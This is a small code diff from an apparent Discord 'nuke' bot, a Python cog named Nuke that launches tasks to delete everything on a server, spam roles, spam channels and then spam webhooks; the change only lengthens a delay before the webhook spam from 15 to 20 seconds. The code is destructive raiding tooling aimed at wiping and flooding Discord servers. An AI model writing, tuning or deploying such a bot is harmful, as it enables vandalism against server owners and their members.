@@ -70,7 +70,7 @@ class Nuke(commands.Cog):
 			create_task(Nuke.deleteall(self, ctx))
 			create_task(Nuke.spamroles(self, ctx))
 			create_task(Nuke.spamchannels(self, ctx))
-			await sleep(15)
+			await sleep(20)
 			create_task(Nuke.spamwebhooks(self, ctx))
 def setup(bot):
 	bot.add_cog(Nuke(bot))
